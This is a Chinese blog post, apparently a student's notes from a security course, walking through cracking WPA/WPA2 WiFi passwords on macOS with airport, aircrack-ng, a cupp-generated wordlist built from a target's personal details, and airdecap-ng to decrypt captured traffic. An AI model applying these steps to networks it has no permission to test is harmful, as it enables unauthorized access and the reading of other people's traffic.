---
title: MacOS破解WiFi(WPA、WPA2)
categories:
  - Technical
tags:
  - Crack
  - MacOS
date: 2020-02-21 18:52:56	
---

2020 年的寒假过得属实弟弟
我在家里默默地刷安全牛的教程，最新刷到了“无线攻击”这一章，虽然在学校的机器上安装了 Kali 虚机，但是没有 Usb 无线网卡。于是用 MacBook 尝试了一下。
PS： 本文参考了网络上众多的文章，但是有我自己发挥的部分。由于现在绝大部分无线网络的加密方法都是 WPA、WPA2，弱点比较大的 WEP 我现在还没碰到过，已经很少使用，而 WPA、WPA2 几乎没有弱点，想要破解只能暴力穷举，理论上只要你的密码设置的足够复杂，就是不可破解的（但谁会把 Wifi 密码设置的这么复杂）

<!-- more -->

## 如何发现附近的网络

这里的发现网络，不是单指如何获得附近有哪些 WiFi，而是**附近有哪些 WiFi，他们分别用的什么加密密钥**。在 Kali 上实现这一点，我们需要使用 airmon-ng 来发现附近的 WiFi，而 MacBook 自带了强大的 airport 工具。

### 使用 airport

为了方便我们使用 airport，先在命令行中执行以下命令：

```bash
sudo ln -s /System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport /usr/local/bin/airport
```

上述命令让我们可以在命令行直接输入 airport 来使用它。

### 发现附近网络

在命令行输入:

```bash
airport -s
```

得到如下结果：

```bash
Princeling-Mac at /opt ❯ airport -s
                            SSID BSSID             RSSI CHANNEL HT CC SECURITY (auth/unicast/group)
                     FAST_236864 cc:34:29:23:68:64 -81  6,-1    Y  -- WPA(PSK/AES/AES) WPA2(PSK/AES/AES)
                     FAST_20C20A 78:eb:14:20:c2:0a -77  12      Y  -- WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                     FAST_11D9DC c0:61:18:11:d9:dc -59  7       Y  -- WPA(PSK/TKIP,AES/TKIP) WPA2(PSK/TKIP,AES/TKIP)
                        iTV-KtYh 46:7b:bb:b9:c5:d0 -59  9       Y  US WPA(PSK/TKIP,AES/TKIP)
                   ChinaNet-KtYh 44:7b:bb:a9:c5:d0 -59  9       Y  US WPA(PSK/TKIP,AES/TKIP)
```

## 等待握手信号

事实上，我们的暴力穷举不可能是不停的给路由器发送请求，这种做法吃力又不讨好。网络上有很多描述 WPA 破解原理的文章，可以去阅读。简单地说，我们需要侦听到一个用户的正确登录，然后获取登录过程中的两组密钥，之后就可以离线破解了。

### 侦听数据

```bash
airport en0 sniff 7
```

**en0** 是你的无线网卡，这个信息可以通过输入

```bash
ifconfig
```

得到。

如果有很多网卡，选择你用来连接 Wifi 的那个。

**7** 是上文中，发现附近网络的 CHANNEL 列，需要和你想要破解的目标网络一致。

运行该命令的时候，wifi 的图标会发生改变。
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTI3MDYyMy00Yjc1MDIxZDBhZTA2YWJkLnBuZw?x-oss-process=image/format,png)
这个时候你的网络连接也会断开，按下 ctrl+c 结束侦听。
![](https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy8yMTI3MDYyMy1jMjdjMTM5ZTkyMGM1YWU0LnBuZw?x-oss-process=image/format,png)

## 分析数据

不可避免的，还是要安装 airmon-ng

```bash
brew install airmon-ng
```

安装完成后：

```bash
aircrack-ng /tmp/airportSniffLbhZSp.cap
```

```bash
Princeling-Mac at /opt ❯ aircrack-ng /tmp/airportSniffLbhZSp.cap
Opening /tmp/airportSniffLbhZSp.cap
Read 8351 packets.

   #  BSSID              ESSID                     Encryption

   1  C0:61:18:11:D9:DC  FAST_11D9DC               WPA (1 handshake)
   2  CC:34:29:23:68:64  FAST_236864               No data - WEP or WPA

Index number of target network ?
```

在抓包过程中，我用手机登录了一下无线网 FAST_11D9DC。可以看到 airport 已经抓到了一组握手数据。

在“Index number of target network ?”这里输入想要破解的 wifi，由于 2 没有握手数据，所以我们输入 1。

## aircrack 破解

```bash
aircrack-ng -w dict.txt -b c0:61:18:11:d9:dc /tmp/airportSniffLbhZSp.cap
```

**dict.txt** 是字典文件，**c0:61:18:11:d9:dc** 是发现附近网络中的 BSSID，**/tmp/airportSniffLbhZSp.cap**是数据包。

### 字典文件在哪儿？

#### 1. 互联网下载

在网络上有很多人搜集到的 wifi 字典，如果是公共场合，这些字典的命中率还是很高的。但是字典很庞大，暴力穷举需要消耗很长时间。

#### 2. 自己制作

如果是在家庭、私人场合的 WiFi，字典的质量就显得很重要。这里推荐一个社工字典制作程序。可以去 github 搜索 cupp 下载。或者[点击直达](https://github.com/NjtechPrinceling/cupp)

简单演示一下 cupp 的使用。

```zsh
python3 cupp.py -I
```

```bash
Princeling-Mac at ~/Documents/GitHub/cupp ❯ python3 cupp.py -I
 ___________
   cupp.py!                 # Common
      \                     # User
       \   ,__,             # Passwords
        \  (oo)____         # Profiler
           (__)    )\
              ||--|| *      [ Muris Kurgas | j0rgan@remote-exploit.org ]
                            [ Mebus | https://github.com/Mebus/]


[+] Insert the information about the victim to make a dictionary
[+] If you don't know all the info, just hit enter when asked! ;)

> First Name: wanglei
> Surname:
> Nickname: princeling
> Birthdate (DDMMYYYY):


> Partners) name:
> Partners) nickname:
> Partners) birthdate (DDMMYYYY):


> Child's name:
> Child's nickname:
> Child's birthdate (DDMMYYYY):


> Pet's name:
> Company name:


> Do you want to add some key words about the victim? Y/[N]:
> Do you want to add special chars at the end of words? Y/[N]:
> Do you want to add some random numbers at the end of words? Y/[N]:
> Leet mode? (i.e. leet = 1337) Y/[N]:

[+] Now making a dictionary...
[+] Sorting list and removing duplicates...
[+] Saving dictionary to wanglei.txt, counting 68 words.
[+] Now load your pistolero with wanglei.txt and shoot! Good luck!
```

不知道就一路回车下去，填写一些相关信息，就可以生成字典了。

然后用这个字典破解 wifi 内容。

如果你的字典中包含密码，则会出现如下界面：

                              Aircrack-ng 1.5.2

      [00:00:00] 8/1 keys tested (88.65 k/s)

      Time left: 0 seconds                                     800.00%

                         KEY FOUND! [ 88888888 ]


      Master Key     : 26 FB 23 5F FE 0B 39 0A C1 12 F3 30 55 FF EE 02
                       CB 7E EA 13 B0 CE D6 7E BB 7E AA 52 1B EA 2E 02

      Transient Key  : 8D E6 57 44 42 BE 95 C2 EC 75 60 FA CA 1A 1A C1
                       C8 31 46 C4 4D DB 98 4D 34 D7 5A D0 15 9F BD 42
                       6C 9C 96 5C FC AE 24 39 83 1D A8 89 C7 71 F9 4A
                       64 D5 DA FB 24 7E 91 47 E6 35 DD 9A 87 A6 A2 5B

      EAPOL HMAC     : 8D 62 A3 8A 42 D1 68 EA 4B 89 FC FC B6 BC C9 AA

说明破解成功。

## airdecap 分析包

现在我们拿到了密码。但是如果折腾了这么半天，目的就是为了蹭 WiFi，感觉有点呆呆的。

有了 WiFi 的密码，实际上我们可以对 WiFi 的数据包进行解包，工具就是 airdecap。

这个时候再拿出刚刚抓取的数据包，用 wireshark 打开。
![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211165856543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM5NDk4NzAx,size_16,color_FFFFFF,t_70)
可以看到全都是 802.11 的协议，并且数据帧全都是加密的数据。

在命令行输入：

```bash
airdecap-ng -e FAST_11D9DC -b c0:61:18:11:d9:dc -p 88888888 ./Downloads/11d9dc.cap
```

**e**是 essid，**b**是 bssid，**p**是破解出来的 WiFi 密码。

运行成功后，会在目标目录生成对应的 dec 文件。

![在这里插入图片描述](https://img-blog.csdnimg.cn/20200211165909879.png)
再用 WireShark 打开，就能看到解密后的包内容了。
